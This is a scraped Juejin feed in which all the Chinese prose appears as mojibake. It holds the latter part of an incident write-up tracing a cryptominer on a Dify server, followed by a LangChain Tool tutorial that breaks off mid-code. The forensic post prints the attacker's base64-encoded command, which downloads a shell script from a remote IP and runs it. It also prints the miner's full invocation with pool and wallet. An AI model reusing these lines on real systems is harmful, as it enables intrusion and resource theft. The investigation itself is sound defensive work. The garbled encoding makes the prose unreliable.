 <span class="hljs-number">228331</span> <span class="hljs-string">root</span>      <span class="hljs-number">20</span>   <span class="hljs-number">0</span>   <span class="hljs-number">14084</span>   <span class="hljs-number">7532   </span><span class="hljs-number">6144 </span><span class="hljs-string">S</span>   <span class="hljs-number">0.3</span>   <span class="hljs-number">0.1</span>   <span class="hljs-number">0</span><span class="hljs-string">:00.01</span> <span class="hljs-string">sshd</span>
 <span class="hljs-string">...</span>
</code></pre>
<p>é™¤äº† <code>hash</code>è¿›ç¨‹ CPU é£™é«˜ä»¥å¤–ï¼Œè¿˜æœ‰2 ä¸ªè¿›ç¨‹ <code>xmrig</code>å’Œ <code>javs</code>, å¯åŠ¨è¿›ç¨‹çš„ç”¨æˆ·æ˜¯ <code>1001</code>ï¼Œç”¨ AI æŸ¥ä¸€ä¸‹å¯¹åº”è¿›ç¨‹æ˜¯ä»€ä¹ˆ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed91cade4e8b40cf9f0fa893593bfed4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=rLFoYHBw5ANKPdARcikzIwphf2Q%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5118395218624830bca99aa2d74aad2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=hUyhOi9csQP5LXUGRBrRD9qKnAc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/82788b6dfa5d48f2b33ccf61172ace63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=HNpGl%2BnLSMEMYwaWvfXSU1bWSoQ%3D" alt="" loading="lazy"/></p>
<p>çŸ¥é“æ˜¯æŒ–çŸ¿è¿›ç¨‹åï¼Œæˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹ï¼Œæ˜¯å“ªä¸ªç”¨æˆ·å“ªä¸ªè¿›ç¨‹å¯åŠ¨çš„æŒ–çŸ¿ç¨‹åºï¼Œ å…ˆæŸ¥çœ‹ç™»å½•çš„ç”¨æˆ·</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">~$</span> <span class="hljs-string">w</span>
 <span class="hljs-number">17</span><span class="hljs-string">:47:47</span> <span class="hljs-string">up</span>  <span class="hljs-number">7</span><span class="hljs-string">:58,</span>  <span class="hljs-number">2</span> <span class="hljs-string">users,</span>  <span class="hljs-attr">load average:</span> <span class="hljs-number">4.60</span><span class="hljs-string">,</span> <span class="hljs-number">5.81</span><span class="hljs-string">,</span> <span class="hljs-number">6.00</span>
<span class="hljs-string">USER</span>     <span class="hljs-string">TTY</span>      <span class="hljs-string">FROM</span>      <span class="hljs-string">LOGIN@</span>   <span class="hljs-string">IDLE</span>   <span class="hljs-string">JCPU</span>   <span class="hljs-string">PCPU</span> <span class="hljs-string">WHAT</span>
<span class="hljs-attr">admin             xxxx      13:42    7:58m  0.00s  0.03s sshd:</span> <span class="hljs-string">admin</span> [<span class="hljs-string">priv</span>]
<span class="hljs-attr">admin             xxxx      17:46    7:58m  0.00s  0.06s sshd:</span> <span class="hljs-string">admin</span> [<span class="hljs-string">priv</span>]
</code></pre>
<p>æ ¹æ®å½“å‰<code>hash</code>è¿›ç¨‹ï¼Œæ ¹æ®è¿›ç¨‹è°ƒç”¨é“¾æŸ¥çœ‹æ˜¯å“ªä¸ªè¿›ç¨‹å¯åŠ¨çš„æœåŠ¡</p>
<pre><code class="hljs language-bash" lang="bash">~$ ps -ef | grep 121817
1001      121817  121797 99 16:44 ?        01:42:14 ./hash -o auto.c3pool.org:13333 -u 45vWwParN9pJSmRVEd57jH5my5N7Py6Lsi3GqTg3wm8XReVLEietnSLWUSXayo5LdAW2objP4ubjiWTM7vk4JiYm4j3Aozd -p miner_1765529082 --randomx-1gb-pages --cpu-priority=0 --cpu-max-threads-hint=80
admin     231920  227367  0 17:50 pts/0    00:00:00 grep 121817

~$ <span class="hljs-built_in">which</span> <span class="hljs-built_in">hash</span>
~$ ps -ef | grep 121797
1001      121797  121794  0 16:44 ?        00:00:00 sh
1001      121817  121797 99 16:44 ?        01:44:04 ./hash -o auto.c3pool.org:13333 -u 45vWwParN9pJSmRVEd57jH5my5N7Py6Lsi3GqTg3wm8XReVLEietnSLWUSXayo5LdAW2objP4ubjiWTM7vk4JiYm4j3Aozd -p miner_1765529082 --randomx-1gb-pages --cpu-priority=0 --cpu-max-threads-hint=80
admin     232754  227367  0 17:50 pts/0    00:00:00 grep 121797

admin@iv-ye5glxdekgbw80bzfw6v:~$ ps -ef | grep 121794
1001      121794   46468  0 16:44 ?        00:00:00 /bin/sh -c <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d|sh
1001      121797  121794  0 16:44 ?        00:00:00 sh
admin     233044  227367  0 17:50 pts/0    00:00:00 grep 121794

<span class="hljs-comment"># æŒ–çŸ¿è„šæœ¬ä»è¿™ä¸ªæœºå™¨ä¸Šä¸‹è½½ï¼Œå¹¶å…è®¸</span>
~$ <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d
wget -O /tmp/12346.sh http://45.156.24.168/12346.sh&amp;&amp;sh /tmp/12346.sh

~$ ps -ef | grep 46468
1001       46468   46102  0 16:08 ?        00:00:11 next-server (v15.5.0)
1001      121794   46468  0 16:44 ?        00:00:00 /bin/sh -c <span class="hljs-built_in">echo</span> d2dldCAtTyAvdG1wLzEyMzQ2LnNoIGh0dHA6Ly80NS4xNTYuMjQuMTY4LzEyMzQ2LnNoJiZzaCAvdG1wLzEyMzQ2LnNo|<span class="hljs-built_in">base64</span> -d|sh
admin     235810  227367  0 17:53 pts/0    00:00:00 grep 46468

~$ ps -ef | grep 46102
1001       46102   45930  0 16:08 ?        00:00:02 node /pnpm/global/5/.pnpm/pm2@6.0.13/node_modules/pm2/bin/pm2 start /app/web/server.js --name dify-web --cwd /app/web -i 2 --no-daemon
1001       46468   46102  0 16:08 ?        00:00:11 next-server (v15.5.0)
1001       46503   46102  0 16:08 ?        00:00:14 next-server (v15.5.0)
admin     236034  227367  0 17:53 pts/0    00:00:00 grep 46102

~$ ps -ef | grep 45930
1001       45930   45791  0 16:08 ?        00:00:00 /bin/sh ./entrypoint.sh
1001       46102   45930  0 16:08 ?        00:00:02 node /pnpm/global/5/.pnpm/pm2@6.0.13/node_modules/pm2/bin/pm2 start /app/web/server.js --name dify-web --cwd /app/web -i 2 --no-daemon
admin     236659  227367  0 17:53 pts/0    00:00:00 grep 45930

<span class="hljs-comment"># å®šä½åˆ° docker å®¹å™¨ä¸­çš„æœåŠ¡</span>
~$ ps -ef | grep 45791
root       45791       1  0 16:08 ?        00:00:01 /usr/bin/containerd-shim-runc-v2 -namespace moby -<span class="hljs-built_in">id</span> 46fac5019c67de63335c8eceb5ba13aae000783676f486f4d5bdeefb18ddcfc0 -address /run/containerd/containerd.sock
1001       45930   45791  0 16:08 ?        00:00:00 /bin/sh ./entrypoint.sh
admin     237662  227367  0 17:54 pts/0    00:00:00 grep 45791

<span class="hljs-comment"># æ ¹æ®å®¹å™¨çš„ id æŸ¥çœ‹æ˜¯å“ªä¸ªå®¹å™¨</span>
~$ docker ps | grep 46fac5
46fac5019c67   langgenius/dify-web:1.9.1                   <span class="hljs-string">"/bin/sh ./entrypoinâ€¦"</span>   2 hours ago   Up 2 hours             3000/tcp                                                                       docker-web-1

<span class="hljs-comment"># åŸæ¥æ˜¯ dify-web å¯åŠ¨çš„æŒ–çŸ¿è¿›ç¨‹</span>
</code></pre>
<p>ä¹Ÿå¯ä»¥ç®€å•ä¸€ç‚¹ï¼Œç”¨<code>pstree</code>æŸ¥çœ‹è°ƒç”¨é“¾è·¯</p>
<pre><code class="hljs language-scss" lang="scss">~$ pstree -<span class="hljs-selector-tag">p</span>  | grep hash
           |<span class="hljs-built_in">-containerd-shim</span>(<span class="hljs-number">45791</span>)-+<span class="hljs-built_in">-sh</span>(<span class="hljs-number">45930</span>)<span class="hljs-built_in">---node</span>(<span class="hljs-number">46102</span>)-+-next-server (v1(<span class="hljs-number">46468</span>)-+<span class="hljs-built_in">-sh</span>(<span class="hljs-number">121794</span>)<span class="hljs-built_in">---sh</span>(<span class="hljs-number">121797</span>)<span class="hljs-built_in">---hash</span>(<span class="hljs-number">121817</span>)-+-{+
</code></pre>
<p>éš¾é“ dify-web åŒ…å«æŒ–çŸ¿è¿›ç¨‹ï¼Œæ˜¯ä¸‹è½½çš„æ‰©å±•æ’ä»¶å¼•å…¥çš„å—ï¼Ÿç»§ç»­é—®ä¸€ä¸‹ AI</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f0d4d56e8005434bbbf447b5948faf7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=xdZMB4zNgz71foWM7ZxRyreoaAY%3D" alt="" loading="lazy"/></p>
<p>å“¦ï¼Œé‚£æŸ¥ä¸€ä¸‹ dify çš„ issues æ˜¯å¦æœ‰ <code>CVE-2025-55182</code>æ¼æ´ï¼Œ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6289b0ae858947768a97de30128391d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54S26bqm:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767596663&amp;x-signature=48gDvJmRGcp0kpTJu2Apq4ioBZY%3D" alt="" loading="lazy"/></p>
<p>æŸ¥çœ‹å®˜æ–¹çš„è§£å†³æ–¹æ³•ï¼Œå‡çº§ dify åˆ°ç‰ˆæœ¬ <code>1.10.2</code>ä»¥ä¸Šï¼Œé—®é¢˜å³å¯è§£å†³ã€‚</p>
<p>ä¸ºä»€ä¹ˆ dify æœºå™¨è¢«ç›¯ä¸Šäº†ï¼Œæ”»å‡»è€…çœ‹ä¸Š dify æœºå™¨ä¸Šçš„é«˜é…ç½®æ˜¾å¡äº†ï¼ŒæŒ–çŸ¿åˆ©å™¨....</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ«å†æŠŠå¤§æ¨¡å‹åªå½“èŠå¤©æœºå™¨äººï¼šLangChain Tool æ‰æ˜¯ AI åº”ç”¨çš„åˆ†æ°´å²­]]></title>    <link>https://juejin.cn/post/7588917508205183026</link>    <guid>https://juejin.cn/post/7588917508205183026</guid>    <pubDate>2025-12-29T07:16:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588917508205183026" data-draft-id="7588733783572578342" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ«å†æŠŠå¤§æ¨¡å‹åªå½“èŠå¤©æœºå™¨äººï¼šLangChain Tool æ‰æ˜¯ AI åº”ç”¨çš„åˆ†æ°´å²­"/> <meta itemprop="keywords" content="LangChain"/> <meta itemprop="datePublished" content="2025-12-29T07:16:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç™½å…°åœ°ç©ºç“¶"/> <meta itemprop="url" content="https://juejin.cn/user/191753514127514"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ«å†æŠŠå¤§æ¨¡å‹åªå½“èŠå¤©æœºå™¨äººï¼šLangChain Tool æ‰æ˜¯ AI åº”ç”¨çš„åˆ†æ°´å²­
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/191753514127514/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç™½å…°åœ°ç©ºç“¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:16:48.000Z" title="Mon Dec 29 2025 07:16:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¾ˆå¤šäººç¬¬ä¸€æ¬¡ç”¨å¤§æ¨¡å‹ï¼Œéƒ½ä¼šå†™å‡ºè¿™æ ·çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">"åŒ—äº¬ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·ï¼Ÿ"</span>)
</code></pre>
<p>ç„¶åæ¨¡å‹ä¼šå¾ˆâ€œè¯šæ³â€åœ°å›ç­”ï¼š</p>
<blockquote>
<p>æˆ‘æ— æ³•è·å–å®æ—¶å¤©æ°”ï¼Œä½†ä½ å¯ä»¥æŸ¥çœ‹ç›¸å…³ç½‘ç«™ã€‚</p>
</blockquote>
<p>è¿™å…¶å®æš´éœ²äº†ä¸€ä¸ªæ ¸å¿ƒé—®é¢˜ï¼š</p>
<p><strong>ä½ ç”¨çš„ä¸æ˜¯ AI åº”ç”¨ï¼Œè€Œåªæ˜¯ä¸€ä¸ªâ€œä¼šè¯´è¯çš„æ¨¡å‹â€ã€‚</strong></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€çœŸæ­£çš„èƒ½åŠ›å·®è·ï¼Œä¸åœ¨ Promptï¼Œè€Œåœ¨ Tool</h2>
<p>Prompt å†ç²¾è‡´ï¼Œæ¨¡å‹æœ¬è´¨ä»ç„¶åªèƒ½â€œç”Ÿæˆæ–‡æœ¬â€ã€‚</p>
<p>è€ŒçœŸå®ä¸–ç•Œçš„åº”ç”¨éœ€è¦çš„æ˜¯ï¼š</p>
<ul>
<li>è®¡ç®—</li>
<li>æŸ¥è¯¢æ•°æ®</li>
<li>è°ƒç”¨æ¥å£</li>
<li>æ‰§è¡Œä¸šåŠ¡é€»è¾‘</li>
</ul>
<p>LangChain ç»™å‡ºçš„ç­”æ¡ˆæ˜¯ï¼š<strong>Tool</strong>ã€‚</p>
<blockquote>
<p>Tool ä¸æ˜¯è®©ä½ â€œå¤šå†™ç‚¹ä»£ç â€ï¼Œ<br/>
è€Œæ˜¯è®©æ¨¡å‹å…·å¤‡â€œæ‰§è¡Œèƒ½åŠ›â€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-1">äºŒã€Tool æ˜¯ä»€ä¹ˆï¼Ÿä¸€å¥è¯è¯´æ˜ç™½</h2>
<p><strong>Tool = ä¸€ä¸ªå¯è¢«å¤§æ¨¡å‹ä¸»åŠ¨è°ƒç”¨çš„å‡½æ•°ã€‚</strong></p>
<p>æ³¨æ„è¿™å‡ ä¸ªå…³é”®è¯ï¼š</p>
<ul>
<li>ä¸»åŠ¨è°ƒç”¨</li>
<li>å‚æ•°ç”±æ¨¡å‹ç”Ÿæˆ</li>
<li>æ˜¯å¦è°ƒç”¨ç”±æ¨¡å‹åˆ¤æ–­</li>
</ul>
<p>è¿™å’Œä½ åœ¨ä»£ç é‡Œå†™ <code>if / else</code> æœ‰æœ¬è´¨åŒºåˆ«ã€‚</p>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ä¸€ä¸ªæœ€åŸºç¡€çš„ Toolï¼šåŠ æ³•å‡½æ•°</h2>
<p>å…ˆä»æœ€ç®€å•çš„å¼€å§‹ã€‚</p>
<pre><code class="hljs language-css" lang="css">const addTool = tool(
  async ({ <span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span> }) =&gt; String(<span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span>),
  {
    name: <span class="hljs-string">"add"</span>,
    description: <span class="hljs-string">"è®¡ç®—ä¸¤ä¸ªæ•°å­—çš„å’Œ"</span>,
    schema: z.<span class="hljs-built_in">object</span>({
      <span class="hljs-selector-tag">a</span>: z.<span class="hljs-built_in">number</span>(),
      b: z.<span class="hljs-built_in">number</span>()
    })
  }
)
</code></pre>
<p>æ•ˆæœå›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/50e5afffc8a447aebd7bfa9e4b20259f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=wHl9vgH0QvTIyMVL1U5xnwpTFn4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4000ab57c88a41279750d043b208a815~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55m95YWw5Zyw56m655O2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767597407&amp;x-signature=TGNGH%2FZaaBKgWlFgQb52xGucHNI%3D" alt="image.png" loading="lazy"/></p>
<p>è¿™é‡Œæœ‰ä¸‰ä¸ªå…³é”®ç‚¹ï¼š</p>
<ol>
<li><strong>å‡½æ•°æœ¬èº«å¹¶ä¸é‡è¦</strong>ï¼Œé‡è¦çš„æ˜¯å®ƒèƒ½è¢«æ¨¡å‹è°ƒç”¨</li>
<li><code>schema</code> å†³å®šæ¨¡å‹å¦‚ä½•æ„é€ å‚æ•°</li>
<li><code>description</code> å†³å®šæ¨¡å‹æ˜¯å¦ä¼šé€‰æ‹©è¿™ä¸ª Tool</li>
</ol>
<blockquote>
<p>Tool çš„â€œè¯´æ˜æ–‡å­—â€ï¼Œæ˜¯å†™ç»™æ¨¡å‹çœ‹çš„ï¼Œä¸æ˜¯ç»™äººçœ‹çš„ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-3">å››ã€Tool çš„æ ¸å¿ƒä¸æ˜¯ä»£ç ï¼Œè€Œæ˜¯è¯­ä¹‰è®¾è®¡</h2>
<p>å¾ˆå¤šäººç”¨ä¸å¥½ Toolï¼ŒåŸå› ä¸æ˜¯ä»£ç å†™é”™ï¼Œè€Œæ˜¯<strong>è¯­ä¹‰ä¸æ¸…</strong>ã€‚</p>
<p>å¦‚æœä½ çš„ Toolï¼š</p>
<ul>
<li>åå­—å«ç³Š</li>
<li>æè¿°æ¨¡æ£±ä¸¤å¯</li>
<li>å‚æ•°æ„ä¹‰ä¸æ˜ç¡®</li>
</ul>
<p>æ¨¡å‹å°±ä¸ä¼šç¨³å®šåœ°è°ƒç”¨å®ƒã€‚</p>
<p>å¯ä»¥ç†è§£ä¸ºï¼š</p>
<blockquote>
<p>Tool æ˜¯ä½ ç»™æ¨¡å‹çš„ä¸€ä»½ã€Œèƒ½åŠ›è¯´æ˜ä¹¦ã€ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">äº”ã€ä¸€ä¸ªæ›´æ¥è¿‘çœŸå®ä¸šåŠ¡çš„ä¾‹å­ï¼šå¤©æ°”æŸ¥è¯¢</h2>
<p>ç”¨ä¸€ä¸ªå‡æ•°æ®æºæ¨¡æ‹ŸçœŸå®ç³»ç»Ÿï¼š</p>
<pre><code class="hljs language-css" lang="css">const fakeWeatherDB = {
  åŒ—äº¬: { temp: <span class="hljs-string">"30Â°C"</span>, condition: <span class="hljs-string">"æ™´"</span>, wind: <span class="hljs-string">"å¾®é£"</span> },
  ä¸Šæµ·: { temp: <span class="hljs-string">"28Â°C"</span>, condition: <span class="hljs-string">"å¤šäº‘"</span>, wind: <span class="hljs-string">"ä¸œé£ 3 çº§"</span> },
  å¹¿å·: { temp: <span class="hljs-string">"32Â°C"</span>, condition: <span class="hljs-string">"é˜µé›¨"</span>, wind: <span class="hljs-string">"å—é£ 2 çº§"</span> },
}
</code></pre>
<p>å®šä¹‰å¯¹åº”çš„ Toolï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> weatherTool = <span class="hljs-title function_">tool</span>(
  <span class="hljs-keyword">async</span> ({ city }) =&gt; {
    <span class="hljs-keyword">const</span> weather = fakeWeatherDB[city]
    <span class="hljs-keyword">if</span> (!weather) <span class="hljs-keyword">return</span> <span class="hljs-string">`æš‚æ— <span class="hljs-subst">${city}</span>çš„å¤©æ°”ä¿¡æ¯`</span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">`å½“å‰<span class="hljs-subst">${city}</span>çš„å¤©æ°”æ˜¯<span class="hljs-subst">${weather.temp}</span>, <span class="hljs-subst">${weather.condition}</span>, é£åŠ›<span class="hljs-subst">${weather.wind}</span>`</span>
  },
  {
    <span class="hljs-attr">name</span>: <span class="hljs-string">"get_weather"</span>,
    <span class="hljs-attr">description</span>: <span class="hljs-string">"æŸ¥è¯¢æŒ‡å®šåŸå¸‚çš„ä»Šæ—¥å¤©æ°”æƒ…å†µ"</span>,
    <span class="hljs-attr">schema</span>: z.<span class="hljs-title function_">object</span>({
      <span class="hljs-attr">city</span>: z.<span class="hljs-title function_">string</span>().<span class="hljs-title function_">describe</span>(<span class="hljs-string">"è¦æŸ¥è¯¢å¤©æ°”çš„åŸå¸‚"</span>)
    })
  }
)
</code></pre>
<p>è¿™ä¸ª Tool å·²ç»éå¸¸æ¥è¿‘çœŸå®ä¸šåŠ¡ä¸­çš„â€œæœåŠ¡å±‚â€ã€‚</p>
<hr/>
<h2 data-id="heading-5">å…­ã€æŠŠ Tool äº¤ç»™æ¨¡å‹</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ChatDeepSeek</span>({
  model: <span class="hljs-string">"deepseek-chat"</span>,
  temperature: <span class="hljs-number">0</span>
}).<span class="hljs-built_in">bindTools</span>([addTool, weatherTool])
</code></pre>
<p>è¿™ä¸€è¡Œä»£ç ï¼Œæœ¬è´¨æ˜¯åœ¨å‘Šè¯‰æ¨¡å‹ï¼š</p>
<blockquote>
<p>ä½ ä¸éœ€è¦ä»€ä¹ˆéƒ½ä¼šï¼Œ<br/>
ä½ åªéœ€è¦å­¦ä¼šä»€ä¹ˆæ—¶å€™è¯¥ç”¨å“ªä¸ªå·¥å…·ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">ä¸ƒã€æ¨¡å‹æ˜¯å¦‚ä½•å†³å®šè°ƒç”¨ Tool çš„ï¼Ÿ</h2>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> res = await model.<span class="hljs-built_in">invoke</span>(<span class="hljs-string">"åŒ—äº¬ä»Šå¤©å¤©æ°”æ€ä¹ˆæ ·"</span>)
</code></pre>
<p>å¦‚æœæ¨¡å‹è®¤ä¸ºéœ€è¦å·¥å…·ï¼Œä¼šè¿”å›ï¼š</p>
<pre><code class="hljs">res.tool_calls
</code></pre>
<p>ä½ åªéœ€è¦æŒ‰è°ƒç”¨ç»“æœæ‰§è¡Œå³å¯ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">if</span> (res.tool_calls?.length) {
